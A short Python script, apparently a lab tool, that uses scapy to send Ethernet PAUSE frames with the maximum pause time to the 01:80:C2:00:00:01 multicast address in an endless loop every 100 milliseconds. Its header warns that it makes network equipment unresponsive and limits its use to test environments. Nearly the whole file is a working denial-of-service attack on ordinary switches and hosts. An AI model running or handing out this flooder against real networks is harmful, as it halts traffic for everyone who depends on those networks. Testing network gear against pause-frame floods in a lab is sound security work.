# !!!
#   WARNING: The information contained within this script is supplied "as-is" with no warranties or guarantees. 
#   I take no responsibility for any damage caused by the use or misuse of this code and it should only be used for testing dedicated network equipment 
#   in a test or lab environment as it will result in network equipement becoming non-responsible
# !!!
import argparse
from scapy.all import *
import time

def send_pause_frames(interface):
    # Define the constant for sleep time in seconds
    SLEEP_TIME_MS = 100
    SLEEP_TIME_S = SLEEP_TIME_MS / 1000.0

    # Define the PAUSE frame
    PAUSE_FRAME = Ether(
        dst='01:80:C2:00:00:01',  # Destination MAC: Spanning tree for bridges
        src='00:00:00:00:00:00',  # Source MAC: Null (you might want to change this)
        type=0x8808               # EtherType: MAC Control
    ) / Raw(
        b'\x00\x01'               # OpCode: Pause
        b'\xFF\xFF'               # pause_time: 65535
        + b'\x00'*42              # Padding
    )

    # Send the PAUSE frame in a loop
    while True:
        try:
            # Send the frame
            sendp(PAUSE_FRAME, iface=interface, verbose=False)

            # Sleep for the defined time
            time.sleep(SLEEP_TIME_S)

        except KeyboardInterrupt:
            # Allow the script to exit gracefully on Ctrl+C
            print("\nExiting...")
            break

def main():
    parser = argparse.ArgumentParser(description='Send PAUSE frames on a specific network interface.')
    parser.add_argument('interface', type=str, help='The network interface to send PAUSE frames on (e.g., eth0).')

    args = parser.parse_args()

    send_pause_frames(args.interface)

if __name__ == '__main__':
    main()

